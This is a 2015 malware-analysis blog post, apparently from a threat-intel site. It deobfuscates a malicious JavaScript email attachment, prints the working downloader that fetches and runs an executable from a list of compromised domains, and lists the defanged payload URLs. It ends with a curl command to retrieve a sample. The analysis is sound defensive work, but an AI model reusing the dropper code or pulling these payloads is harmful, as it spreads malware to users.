@@ -1,0 +1,423 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>More Emails With Malicious JavaScript Attachments - thought|pipe</title>
+  <meta name="author" content="elauqsap">
+
+  
+  <meta name="description" content="More Emails With Malicious JavaScript Attachments written in malspam, malware analysis, threat intel Slightly late but I ran into another malicious &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://elauqsap.github.io/blog/2015/08/11/more-emails-with-malicious-javascript-attachments">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="thought|pipe" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-46649594-2']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+  <body>
+    <a href="/" class="home-icon">
+      <img src="/images/home.png"/>
+    </a>
+
+    <article role="article" class="full-single-article">
+  <div class="container">
+    <div class="row">
+      <div class="col-md-8 col-md-offset-2">
+        <h1>More Emails With Malicious JavaScript Attachments</h1>
+        <div class="meta">
+          written 
+
+
+
+
+
+
+
+
+  
+
+
+
+<time datetime="2015-08-11T19:44:56-05:00" pubdate data-updated="true"></time>
+          
+
+in
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/malspam/'>malspam</a>, <a class='category' href='/blog/categories/malware-analysis/'>malware analysis</a>, <a class='category' href='/blog/categories/threat-intel/'>threat intel</a>
+  
+</span>
+
+
+        </div>
+        <p>Slightly late but I ran into another malicious JavaScript attachment that appears to be downloading something besides Ransomware. From automated sandbox analysis it seems to be a Rovnix variant but I am not so sure. I plan to do a little more OSINT and provide an update but here is my analysis for now.</p>
+
+<!--more-->
+
+
+<h4>Email Indicators</h4>
+
+<pre><code>Received: from 1487.vanager.de (1487.vanager.de [195.225.105.38])
+From: "Sofia Gallo" &lt;a.scelerisque.sed@mollisDuissit.edu&gt;
+To: REDACTED
+Subject: Attention! Reservation change.
+Date: Sat, 8 Aug 2015
+Attachment: Photo_8739.zip -&gt; IMG_7099.js
+</code></pre>
+
+<hr />
+
+<h4>Message Body</h4>
+
+<pre><code>I wanted to change a reservation!
+Because some friends canceled, I would like to change reservation to two
+double room!
+
+Details of changes in attachment.
+Thanks!
+</code></pre>
+
+<h3>Deobfuscating the JavaScript</h3>
+
+<p>There are a few subtle differences in this weeks example that make it different from the campaign we saw last week. Besides the actual malware being delivered, this file is not a double dot extension like last week where the file ended as <code>.doc.js</code>. The obfuscation is also slightly different because we didn&rsquo;t have to tweak the original code in order to see the function it builds for evaluation. The deobfuscated function also contains an array of domains that the script attempts to download 1 of 2 payloads (pdf or exe).</p>
+
+<figure class='code'><figcaption><span>IMG_7099.js</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="c1">// Key to deobfuscate</span>
+</span><span class='line'><span class="kd">var</span> <span class="nx">key</span> <span class="o">=</span> <span class="s1">&#39;eKTHj9DZ&#39;</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1">// Obfuscated function</span>
+</span><span class='line'><span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="s1">&#39;\x03&gt;:+\x1eP+4E,;:\x1fMl?L0&quot;)\x18\x190gGz`e\x27x\x17\x15*\x06z\x0b%td\x10)\x02\x1a\x039t\x17t&amp;\x04\x19h)q\x01\x1b5\x19\x1d\x12/j\x09\x09K\x08\x1b\x05J|\x08\x1f(\x0e\x1a\x1c-l\x09\x080\x00z\x0b%tk6\x04%3=\x0b^!z,\x09\x19\x0c+m\x05\x19$\x1bz\x0b%tk-\x15f7\x27\x04M!4\x11d  \x0fT!)J*7)\x0e\x5c)#E\x1c\x11\x04&amp;w\x01\x096\x03\x11\x1a(x\x08t&amp;\x04\x19g\x1dIi9\x0a% -\x04Mk.\x0d.9-\x19\x1603\x0b2y.\x18X)?\x12$&amp;#Jp\x10\x09(\x12\x00\x0d+\x17\x07\x15(d,%\x06K49E&lt;#?Du\x05\x14!\x1f\x1b\x1d8s\x05\x0a$\x05z\x0b%td\x13+\x1f\x11\x0f8p\x10\x036\x06\x07\x06-\x17\x07\x15(k\x17\x1a/x\x10\x133\x0e\x12\x07%}\x17\x0e&lt;\x07\x1d\x1b&gt;\x17\x07\x15(k#?\x1d\x17\x0f\x17!\x0e\x06\x1d$s\x01\x0d \x07\x06\x11Dz\x0b\x17E\x0a\x10\x0d$`\x05\x151\x0e\x18\x0d/mj\x19*\x06t\x05+s\x0b\x08&amp;\x0a\x07\x0dDv\x16\x1dE\x02\x07\x1c+w\x06\x0f)\x00\x18\x01\x27xj\x157\x0ct\x0d$m\x0c\x1f)\x1bz\x0b%td\x12 \x0a\x18\x01$~\x17\x0a7\x02\x1a\x0f=v\x16\x116\x03\x1b\x189\x17\x07\x15(d#8GZ+4\x11.:&lt;EM,?\x08.\x27g\x1eK%,\x00\x27y*\x06V#=\x009t\x1c?~\x16\x1b-\x04\x00\x0d&amp;jj\x19*\x06t?\x1dNj&lt;\x09$&amp;!\x0bW&amp;(\x10.:!\x04^j9\x0a&amp;t\x02?x\x08\x0e*\x1c\x11\x1a&gt;k\x0d\x1b+\x0c\x18\x0dDz\x0b\x17E\x06\x15\x09!z\x05\x08!e\x17\x07\x27\x193-\x12e&gt;)\x01P)8\x0a8 f\x1aUd\x0e-\x0e\x02\x01&amp;u\x05\x1d \x1d\x11\x1c/k\x0d\x14$\x19\x0d\x00%j\x14\x131\x0a\x18f)v\x09xK8$$\x03MlxEi}s\x0fAyxGvi-U\x1bj?\x1d.vrH\x174&gt;\x03io.\x05Kl,\x049t\x05W\x09\x7f\x17Y?z$\x0fW#.\x0dp\x19cA\x10?,\x049t&amp;WW!-E\x0a7&lt;\x03O!\x02*)&gt;-\x09Mlx2\x187:\x03I0t6#1$\x06\x1bmv*v:f/A4;\x0b/\x11&amp;\x1cP65\x0b&amp;1&amp;\x1ej0(\x0c%3;B\x1ba\x0e \x06\x04mH\x10o\x09\x119=&amp;\x0d\x17&quot;(\x0a&amp;\x17 \x0bK\x075\x01.|qX\x10o\x17\x04?&lt;f\x18V14\x01ce-R\x13\x09;\x11#z:\x0bW 5\x08c}aA\x5c&lt;v vdd\x18\x04*?\x12k\x15+\x1eP2?=\x046&quot;\x0fZ0rG\x06\x07\x10\x27uvt=\x06\x18\x00&gt;m\x14xLp&amp;f\x05W6?\x04/-;\x1eX0?\x06#5&amp;\x0d\x5cy&lt;\x10%7&lt;\x03V*rL0=.B\x0dyg\x17e&amp;-\x0b]=\x09\x11* -L\x1fvjUvi:DJ0;\x11&gt;\x27a\x11O%(E.i&amp;\x0fNd\x1b\x06?=&gt;\x0fa\x0b8\x0f.7&lt;B\x1b\x05\x1e*\x0f\x16f9M6?\x04&amp;vaQP&quot;r\x00e;8\x0fWlsI.z&lt;\x13I!gTg1f\x1dK-.\x00c&amp;f8\x5c7*\x0a%\x27-(V #Lga-Y\x05!t\x16&quot;.-CB\x01gTg1f\x1aV73\x11&quot;;&amp;W\x09h?K85&gt;\x0fm+\x1c\x0c\x271`%\x15vs^?&amp;1\x11Wj\x08\x10%|\x07F\x08hjL67)\x1eZ,r\x11b/5\x17\x5cj9\x09$\x27-B\x109\x27^?&amp;1\x11Kj5\x15.:`H~\x01\x0eGgv \x1eM4`Jdvc\x1eb\x09\x07Ni{/\x0fMj*\x0d;k,\x0d_ &lt;\x02vvc\x27X02K95&amp;\x0eV)rL`vn\x01\x5c=gG`?-\x13\x12!vDz}d\x18\x177?\x0b/|a\x17Z%.\x06#|)CB93\x03ceuW|m8\x17.5#\x17D/?\x1cvv._\x1bh=\x0a9!&lt;B\x1bfsI,;:\x1fMlxC;0.WJ!;\x17(&lt;jC\x02&#39;</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">var</span> <span class="nx">_0x12bd</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="s2">&quot;\x6C\x65\x6E\x67\x74\x68&quot;</span><span class="p">,</span> <span class="s2">&quot;\x63\x68\x61\x72\x43\x6F\x64\x65\x41\x74&quot;</span><span class="p">,</span> <span class="s2">&quot;\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65&quot;</span><span class="p">];</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1">// Build the function string to be evaluated</span>
+</span><span class='line'><span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">dhhas3uu</span> <span class="o">=</span> <span class="nx">_0x12bd</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nx">code</span> <span class="o">=</span> <span class="nx">_0x12bd</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nx">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">b</span><span class="p">[</span><span class="nx">_0x12bd</span><span class="p">[</span><span class="mi">1</span><span class="p">]];</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>  <span class="nx">dhhas3uu</span> <span class="o">+=</span> <span class="nb">String</span><span class="p">[</span><span class="nx">_0x12bd</span><span class="p">[</span><span class="mi">3</span><span class="p">]](</span><span class="nx">b</span><span class="p">[</span><span class="nx">_0x12bd</span><span class="p">[</span><span class="mi">2</span><span class="p">]](</span><span class="nx">i</span><span class="p">)</span> <span class="o">^</span> <span class="nx">key</span><span class="p">[</span><span class="nx">_0x12bd</span><span class="p">[</span><span class="mi">2</span><span class="p">]](</span><span class="nx">j</span><span class="p">)),</span> <span class="nx">j</span><span class="o">++</span><span class="p">,</span> <span class="nx">j</span> <span class="o">==</span> <span class="nx">key</span><span class="p">[</span><span class="nx">_0x12bd</span><span class="p">[</span><span class="mi">1</span><span class="p">]]</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">);</span>
+</span><span class='line'><span class="p">};</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1">// Evaluate the deobfuscated JavaScript</span>
+</span><span class='line'><span class="nb">eval</span><span class="p">(</span><span class="nx">dhhas3uu</span><span class="p">);</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span>deobfuscated.js</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">function</span> <span class="nx">gorut</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span>
+</span><span class='line'>  <span class="kd">var</span> <span class="nx">t</span> <span class="o">=</span> <span class="s2">&quot;14-MASOOM.COM JLINKSMS.COM CHEAPRIZESMS.COM ELEMENTGUMRUK[.]COM/language IBMDATACAP[.]COM/wp-content/themes/academy WELLNESSHERBAL[.]COM/wp-content/themes/tiny-framework ITSMYTEA[.]COM/xmlrpc www.LANDTOURJAPAN[.]COM INTEGRITYSMSNG[.]COM CREATIVEFOODSTYLIST[.]COM www.KMDERUNJEWELRY[.]COM ADENYAOTELEET[.]COM MAJORCASE[.]ORG ISTANBULKLIMA[.]ORG ENTHELP[.]COM HEALINGSPRINGWORKSHOPS[.]COM/wp-content/themes/travel-blogger TUGRAHOTELS[.]COM www.florianbruening[.]com JUALTOWERTRIANGLE[.]COM MAAKCARD[.]COM www.jakimbost[.]pl THEVILLAGEVETERINARYHOSPITAL[.]COM&quot;</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nx">ex</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span> <span class="o">==</span> <span class="nx">e</span> <span class="o">?</span> <span class="s2">&quot;.exe&quot;</span> <span class="o">:</span> <span class="s2">&quot;.pdf&quot;</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">M</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">M</span> <span class="o">&lt;</span> <span class="nx">t</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">M</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="kd">var</span> <span class="nx">n</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="s2">&quot;WScript.Shell&quot;</span><span class="p">),</span> <span class="nx">O</span> <span class="o">=</span> <span class="nx">n</span><span class="p">.</span><span class="nx">ExpandEnvironmentStrings</span><span class="p">(</span><span class="s2">&quot;%TEMP%&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="mi">92</span><span class="p">)</span> <span class="o">+</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">round</span><span class="p">(</span><span class="mf">100000000.0</span> <span class="o">*</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">())</span> <span class="o">+</span> <span class="nx">ex</span><span class="p">,</span> <span class="nx">E</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">r</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="s2">&quot;MSXML2.XMLHTTP&quot;</span><span class="p">);</span>
+</span><span class='line'>      <span class="nx">r</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+</span><span class='line'>          <span class="k">if</span><span class="p">(</span><span class="mi">4</span> <span class="o">==</span> <span class="nx">r</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">&amp;&amp;</span> <span class="mi">200</span> <span class="o">==</span> <span class="nx">r</span><span class="p">.</span><span class="nx">status</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>              <span class="kd">var</span> <span class="nx">e</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="s2">&quot;ADODB.Stream&quot;</span><span class="p">);</span>
+</span><span class='line'>              <span class="k">if</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">open</span><span class="p">(),</span> <span class="nx">e</span><span class="p">.</span><span class="nx">type</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">e</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">r</span><span class="p">.</span><span class="nx">ResponseBody</span><span class="p">),</span> <span class="mf">5000.0</span> <span class="o">&lt;</span> <span class="nx">e</span><span class="p">.</span><span class="nx">size</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                  <span class="nx">E</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">e</span><span class="p">.</span><span class="nx">position</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">e</span><span class="p">.</span><span class="nx">saveToFile</span><span class="p">(</span><span class="nx">O</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+</span><span class='line'>                  <span class="k">try</span> <span class="p">{</span>
+</span><span class='line'>                      <span class="nx">n</span><span class="p">.</span><span class="nx">Run</span><span class="p">(</span><span class="nx">O</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span><span class='line'>                  <span class="p">}</span> <span class="k">catch</span><span class="p">(</span><span class="nx">t</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>
+</span><span class='line'>                  <span class="p">}</span>
+</span><span class='line'>              <span class="p">}</span>
+</span><span class='line'>              <span class="nx">e</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
+</span><span class='line'>          <span class="p">}</span>
+</span><span class='line'>      <span class="p">};</span>
+</span><span class='line'>      <span class="k">try</span> <span class="p">{</span>
+</span><span class='line'>          <span class="nx">r</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span> <span class="s2">&quot;hxxp://&quot;</span> <span class="o">+</span> <span class="nx">t</span><span class="p">[</span><span class="nx">M</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot;/get.php?dgfdfg=&quot;</span> <span class="o">+</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span> <span class="o">+</span> <span class="s2">&quot;&amp;key=&quot;</span> <span class="o">+</span> <span class="nx">key</span> <span class="o">+</span> <span class="nx">e</span><span class="p">,</span> <span class="o">!</span><span class="mi">1</span><span class="p">),</span> <span class="nx">r</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+</span><span class='line'>      <span class="p">}</span> <span class="k">catch</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="mi">1</span> <span class="o">==</span> <span class="nx">E</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="nx">key</span> <span class="o">=</span> <span class="s2">&quot;f5&quot;</span><span class="p">,</span> <span class="nx">gorut</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">),</span> <span class="nx">gorut</span><span class="p">(</span><span class="s2">&quot;&amp;pdf=search&quot;</span><span class="p">);</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Removing a few lines in <code>gorut()</code> routine of the download script allows to print out download links for the two payloads it attempts to get. Basically you need to remove the ActiveX code and modify <code>r.open</code> to <code>console.log</code> function removing the <code>!1</code> parameter. Running this in node.js will give us a list of payload downloads for the second stage.</p>
+
+<figure class='code'><figcaption><span>modified_function.js</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">function</span> <span class="nx">gorut</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span>
+</span><span class='line'>  <span class="kd">var</span> <span class="nx">t</span> <span class="o">=</span> <span class="s2">&quot;14-MASOOM.COM JLINKSMS.COM CHEAPRIZESMS.COM ELEMENTGUMRUK[.]COM/language IBMDATACAP[.]COM/wp-content/themes/academy WELLNESSHERBAL[.]COM/wp-content/themes/tiny-framework ITSMYTEA[.]COM/xmlrpc www.LANDTOURJAPAN[.]COM INTEGRITYSMSNG[.]COM CREATIVEFOODSTYLIST[.]COM www.KMDERUNJEWELRY[.]COM ADENYAOTELEET[.]COM MAJORCASE[.]ORG ISTANBULKLIMA[.]ORG ENTHELP[.]COM HEALINGSPRINGWORKSHOPS[.]COM/wp-content/themes/travel-blogger TUGRAHOTELS[.]COM www.florianbruening[.]com JUALTOWERTRIANGLE[.]COM MAAKCARD[.]COM www.jakimbost[.]pl THEVILLAGEVETERINARYHOSPITAL[.]COM&quot;</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nx">ex</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span> <span class="o">==</span> <span class="nx">e</span> <span class="o">?</span> <span class="s2">&quot;.exe&quot;</span> <span class="o">:</span> <span class="s2">&quot;.pdf&quot;</span><span class="p">;</span>
+</span><span class='line'>  <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">M</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">M</span> <span class="o">&lt;</span> <span class="nx">t</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">M</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span> <span class="s2">&quot;hxxp://&quot;</span> <span class="o">+</span> <span class="nx">t</span><span class="p">[</span><span class="nx">M</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot;/get.php?dgfdfg=&quot;</span> <span class="o">+</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span> <span class="o">+</span> <span class="s2">&quot;&amp;key=&quot;</span> <span class="o">+</span> <span class="nx">key</span> <span class="o">+</span> <span class="nx">e</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h4>Payload Links</h4>
+
+<pre><code>GET hxxp://14-MASOOM[.]COM/get.php?dgfdfg=0.2042055584024638&amp;key=f5
+GET hxxp://JLINKSMS[.]COM/get.php?dgfdfg=0.4357860581949353&amp;key=f5
+GET hxxp://CHEAPRIZESMS[.]COM/get.php?dgfdfg=0.9873443075921386&amp;key=f5
+GET hxxp://ELEMENTGUMRUK[.]COM/language/get.php?dgfdfg=0.697707447456196&amp;key=f5
+GET hxxp://IBMDATACAP[.]COM/wp-content/themes/academy/get.php?dgfdfg=0.21713185170665383&amp;key=f5
+GET hxxp://WELLNESSHERBAL[.]COM/wp-content/themes/tiny-framework/get.php?dgfdfg=0.5791356258559972&amp;key=f5
+GET hxxp://ITSMYTEA[.]COM/xmlrpc/get.php?dgfdfg=0.5410346924327314&amp;key=f5
+GET hxxp://www.LANDTOURJAPAN[.]COM/get.php?dgfdfg=0.418818884762004&amp;key=f5
+GET hxxp://INTEGRITYSMSNG[.]COM/get.php?dgfdfg=0.029143808409571648&amp;key=f5
+GET hxxp://CREATIVEFOODSTYLIST[.]COM/get.php?dgfdfg=0.3915193013381213&amp;key=f5
+GET hxxp://www.KMDERUNJEWELRY[.]COM/get.php?dgfdfg=0.07052874471992254&amp;key=f5
+GET hxxp://ADENYAOTELEET[.]COM/get.php?dgfdfg=0.8330098567530513&amp;key=f5
+GET hxxp://MAJORCASE[.]ORG/get.php?dgfdfg=0.5714250793680549&amp;key=f5
+GET hxxp://ISTANBULKLIMA[.]ORG/get.php?dgfdfg=0.6278960527852178&amp;key=f5
+GET hxxp://ENTHELP[.]COM/get.php?dgfdfg=0.48202996351756155&amp;key=f5
+GET hxxp://HEALINGSPRINGWORKSHOPS[.]COM/wp-content/themes/travel-blogger/get.php?dgfdfg=0.2205682178027928&amp;key=f5
+GET hxxp://TUGRAHOTELS[.]COM/get.php?dgfdfg=0.5332026502583176&amp;key=f5
+GET hxxp://www.florianbruening[.]com/get.php?dgfdfg=0.0033856993541121483&amp;key=f5
+GET hxxp://JUALTOWERTRIANGLE[.]COM/get.php?dgfdfg=0.7687414824031293&amp;key=f5
+GET hxxp://MAAKCARD[.]COM/get.php?dgfdfg=0.14662570762448013&amp;key=f5
+GET hxxp://www.jakimbost[.]pl/get.php?dgfdfg=0.4327525827102363&amp;key=f5
+GET hxxp://THEVILLAGEVETERINARYHOSPITAL[.]COM/get.php?dgfdfg=0.48534721904434264&amp;key=f5
+GET hxxp://14-MASOOM[.]COM/get.php?dgfdfg=0.6709314966574311&amp;key=f5&amp;pdf=search
+GET hxxp://JLINKSMS[.]COM/get.php?dgfdfg=0.020113263744860888&amp;key=f5&amp;pdf=search
+GET hxxp://CHEAPRIZESMS[.]COM/get.php?dgfdfg=0.6769137345254421&amp;key=f5&amp;pdf=search
+GET hxxp://ELEMENTGUMRUK[.]COM/language/get.php?dgfdfg=0.1893466750625521&amp;key=f5&amp;pdf=search
+GET hxxp://IBMDATACAP[.]COM/wp-content/themes/academy/get.php?dgfdfg=0.11392477317713201&amp;key=f5&amp;pdf=search
+GET hxxp://WELLNESSHERBAL[.]COM/wp-content/themes/tiny-framework/get.php?dgfdfg=0.7516817327123135&amp;key=f5&amp;pdf=search
+GET hxxp://ITSMYTEA[.]COM/xmlrpc/get.php?dgfdfg=0.45238890522159636&amp;key=f5&amp;pdf=search
+GET hxxp://www.LANDTOURJAPAN[.]COM/get.php?dgfdfg=0.5003419334534556&amp;key=f5&amp;pdf=search
+GET hxxp://INTEGRITYSMSNG[.]COM/get.php?dgfdfg=0.7602681068237871&amp;key=f5&amp;pdf=search
+GET hxxp://CREATIVEFOODSTYLIST[.]COM/get.php?dgfdfg=0.2591306504327804&amp;key=f5&amp;pdf=search
+GET hxxp://www.KMDERUNJEWELRY[.]COM/get.php?dgfdfg=0.19865264417603612&amp;key=f5&amp;pdf=search
+GET hxxp://ADENYAOTELEET[.]COM/get.php?dgfdfg=0.8011750828009099&amp;key=f5&amp;pdf=search
+GET hxxp://MAJORCASE[.]ORG/get.php?dgfdfg=0.7017634396906942&amp;key=f5&amp;pdf=search
+GET hxxp://ISTANBULKLIMA[.]ORG/get.php?dgfdfg=0.33236109651625156&amp;key=f5&amp;pdf=search
+GET hxxp://ENTHELP[.]COM/get.php?dgfdfg=0.25800628517754376&amp;key=f5&amp;pdf=search
+GET hxxp://HEALINGSPRINGWORKSHOPS[.]COM/wp-content/themes/travel-blogger/get.php?dgfdfg=0.4463676530867815&amp;key=f5&amp;pdf=search
+GET hxxp://TUGRAHOTELS[.]COM/get.php?dgfdfg=0.5060989174526185&amp;key=f5&amp;pdf=search
+GET hxxp://www.florianbruening[.]com/get.php?dgfdfg=0.8751774763222784&amp;key=f5&amp;pdf=search
+GET hxxp://JUALTOWERTRIANGLE[.]COM/get.php?dgfdfg=0.08316186326555908&amp;key=f5&amp;pdf=search
+GET hxxp://MAAKCARD[.]COM/get.php?dgfdfg=0.8340241997502744&amp;key=f5&amp;pdf=search
+GET hxxp://www.jakimbost[.]pl/get.php?dgfdfg=0.9773174184374511&amp;key=f5&amp;pdf=search
+GET hxxp://THEVILLAGEVETERINARYHOSPITAL[.]COM/get.php?dgfdfg=0.6214603304397315&amp;key=f5&amp;pdf=search
+</code></pre>
+
+<p>So now that we have the payload URLs we can download them for further analysis. It attempts to download either a malicious executable or pdf. The URLs without <code>&amp;pdf=search</code> on the end are the MS-DOS executables. When attempting to download these I noticed that my curl command was failing with my Firefox user agent (404 page). Switching it to a traditional IE10 user agent allowed me to download the payload.</p>
+
+<h4>Failed Command</h4>
+
+<pre><code>curl -vA "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0" -L "hxxp://TUGRAHOTELS[.]COM/get.php?dgfdfg=0.5332026502583176&amp;key=f5" &gt; bad_dl.exe
+
+% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                               Dload  Upload   Total   Spent    Left  Speed
